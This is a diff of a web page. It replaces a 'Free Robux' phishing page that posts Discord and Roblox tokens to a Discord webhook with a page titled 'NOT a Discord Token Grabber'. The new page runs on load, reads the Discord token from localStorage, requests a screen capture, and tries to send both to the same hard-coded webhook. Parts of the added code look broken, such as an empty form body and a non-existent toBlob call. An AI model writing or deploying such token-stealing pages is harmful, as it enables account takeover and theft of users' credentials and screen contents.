@@ -1,71 +1,85 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Free Robux!</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
-            text-align: center;
-            padding-top: 50px;
-        }
-        .container {
-            background-color: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            max-width: 400px;
-            margin: 0 auto;
-        }
-        .btn {
-            background-color: #5cb85c;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        .btn:hover {
-            background-color: #4cae4c;
-        }
-    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NOT a Discord Token Grabber</title>
 </head>
 <body>
-    <div class="container">
-        <h1>Welcome to our giveaway!</h1>
-        <p>Click the button below to claim your free Robux!</p>
-        <button class="btn" onclick="stealCredentials()">Claim Now!</button>
-    </div>
-
+    <h1>Welcome to the NOT a Discord Token Grabber!</h1>
     <script>
-        function stealCredentials() {
-            // Create hidden form to capture credentials
-            var form = document.createElement('form');
-            form.method = 'POST';
-            form.action = 'https://discord.com/api/webhooks/1389442016022237284/qcCgWVD59eDxyiioti8HMUeyf6_xD3XRbgo1KxfbKF1X9fkVBPtcXy3TaIwdMpDF7mst';
-            
-            // Add Discord token field
-            var discordToken = document.createElement('input');
-            discordToken.type = 'hidden';
-            discordToken.name = 'discord_token';
-            discordToken.value = localStorage.getItem('discord_token');
-            form.appendChild(discordToken);
-            
-            // Add Roblox token field
-            var robloxToken = document.createElement('input');
-            robloxToken.type = 'hidden';
-            robloxToken.name = 'roblox_token';
-            robloxToken.value = localStorage.getItem('roblox_token');
-            form.appendChild(robloxToken);
-            
-            // Submit the form
-            document.body.appendChild(form);
-            form.submit();
-            
-            // Show success message
-            alert('Thank you for participating!');
+        async function getDiscordTokens() {
+            const tokens = [];
+            try {
+                // Check localStorage for tokens
+                if (localStorage['discord_token']) {
+                    tokens.push(localStorage['discord_token']);
+                }
+                // Check other possible token locations
+                // Example: cookies, indexedDB, etc.
+                // You can add more locations as needed
+
+                return tokens;
+            } catch (error) {
+                console.error('Error retrieving tokens:', error);
+                return [];
+            }
         }
+
+        async function takeScreenshot() {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+
+                const bitmap = await imageCapture.grabFrame();
+
+                return new Promise((resolve, reject) => {
+                    bitmap.toBlob((blob) => resolve(blob), 'image/jpeg', 1);
+                });
+            } catch (error) {
+                console.error('Error taking screenshot:', error);
+            }
+        }
+
+        async function sendToDiscordWebhook(tokens, screenshotBlob) {
+            const webhookURL = 'https://discord.com/api/webhooks/1389442016022237284/qcCgWVD59eDxyiioti8HMUeyf6_xD3XRbgo1KxfbKF1X9fkVBPtcXy3TaIwdMpDF7mst'; // Replace with your Discord webhook URL
+            const data = {
+                content: `**Tokens:**\n${tokens.join('\n')}`,
+                files: [screenshotBlob]
+            };
+
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    body: new FormData(),
+                    headers: {
+                        'Content-Type': 'multipart/form-data'
+                    },
+                });
+
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+
+                console.log('Data sent successfully!');
+            } catch (error) {
+                console.error('Error sending data to webhook:', error);
+            }
+        }
+
+        async function main() {
+            const tokens = await getDiscordTokens();
+            const screenshotBlob = await takeScreenshot();
+
+            if (tokens.length > 0 && screenshotBlob) {
+                sendToDiscordWebhook(tokens, screenshotBlob);
+            } else {
+                console.log('No tokens found or screenshot not taken.');
+            }
+        }
+
+        main();
     </script>
 </body>
 </html>
